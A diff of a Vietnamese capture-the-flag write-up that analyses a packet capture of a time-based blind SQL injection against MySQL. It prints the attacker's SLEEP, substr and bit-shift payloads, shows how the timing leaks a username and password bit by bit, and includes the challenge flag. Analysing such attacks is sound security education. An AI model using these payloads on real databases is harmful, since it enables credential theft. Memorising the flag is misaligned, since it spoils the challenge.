@@ -1,6 +1,6 @@
 # exfil
 
-- Đầu tiên, phân tích sơ qua thì ta thấy file capture này đang mô phỏng lại quá trình attacker "data exfiltration" lên server thông qua protocol mysql
+- Đầu tiên, phân tích sơ qua thì ta thấy file capture này đang mô phỏng lại quá trình Time Based Blind SQL Injection lên server thông qua protocol mysql
 - Filter "mysql" ta sẽ thấy được hàng loạt các câu lệnh mysql injection được attacker gửi lên server
 ![1](1.png)
 
@@ -12,19 +12,33 @@
 - Xử lý luồng thực thi từ trong ra ngoài thì ta sẽ có:
 	- SELECT group_concat(database_name) FROM mysql.innodb_table_stats
 group_concat(database_name) lấy tất cả record của Field database_name từ bảng mysql.innodb_table_stats (bảng này chứa tên các bảng được khởi tạo).
-	- substr(string, 1,1) : lấy kí tự đầu tiên của string
+	- substr(string,1,1) : lấy kí tự thứ 1 của string,ở đây attacker tăng dần index lên để dò vị trí các kí tự
+	vd:  string =  'admin' => substr(string,1,1) = a, substr(string,2,1) = d ... 
 	- ASCII (char): chuyển kí tự sang mã ASCII
-	- shift right 7 <==> chia cho 2 ^ 7, and với 1
-	- Nếu kết quả là 0 thì sẽ không sleep, 1 thì sleep 1*3 (s)
-- Vậy chỉ cần dựa vào thời gian trao đổi giữa các gói tin attacker có thể dễ dàng bruteforce được database_name.
+	- ![ascii](ASCII.png)
+	- ">> 7 & 1" đoạn này shift right 7, xong rồi and với 1
+	- Nếu kết quả trả về từ substr() là NUL thì sẽ trả về ASCII(NUL) = 0, do đó 0 >> 7 = 0; 0 & 1 = 0
+	- Mình lấy 3 gói tin delay khoảng 3 (s), attacker dùng để bruteforce chữ 'a' trong column user:
+	- ```mysql
+			SLEEP((SELECT ASCII(substr((SELECT user FROM db_m3149.users), 1, 1)) >> 6 & 1) * 3)
+			SLEEP((SELECT ASCII(substr((SELECT user FROM db_m3149.users), 1, 1)) >> 5 & 1) * 3)
+			SLEEP((SELECT ASCII(substr((SELECT user FROM db_m3149.users), 1, 1)) >> 0 & 1) * 3)
+	  ```
+	-
+		97 >> 6  & 1 == 1 ==> SLEEP(3)
+		97 >> 5  & 1 == 1 ==> SLEEP(3)
+		97 >> 0  & 1 == 1 ==> SLEEP(3)
+
+- Vậy chỉ cần dựa vào thời gian delay giữa các cặp gói tin request/response attacker có thể dễ dàng bruteforce được database_name.
 - Ta tiếp tục xét đoạn mysql sau:
 ![3](3.png)
+
 	```mysql
 		SLEEP((SELECT ASCII(substr((SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=0x64625f6d33313439), 1, 1)) >> 2 & 1) * 3)
 	```
-	- Sau khi đã bruteforce được database_name là 0x64625f6d33313439, attacker tiếp tục tìm những database do user khởi tạo
+	- Sau khi đã bruteforce được database_name là 0x64625f6d33313439(db_m3149.users), attacker tiếp tục tìm những table do user khởi tạo
 
-- Phân tích những gói tin mysql tiếp theo, ta sẽ thấy attacker đã brute thành công database có tên là db_m3149.users, table user và password
+- Phân tích những gói tin mysql tiếp theo, ta sẽ thấy attacker đã brute thành công column user và password
 
 ```mysql
 	SELECT SLEEP((SELECT ASCII(substr((SELECT user FROM db_m3149.users), 1, 1)) >> 6 & 1) * 3)
@@ -108,6 +122,6 @@ print("[+] password :", Decode(passwd))
 
 - result :
 ```sh
-	[+] user : admin
-	[+] password : HTB{b1t_sh1ft1ng_3xf1l_1s_c00l}
+[+] user : admin
+[+] password : HTB{b1t_sh1ft1ng_3xf1l_1s_c00l}
 ```
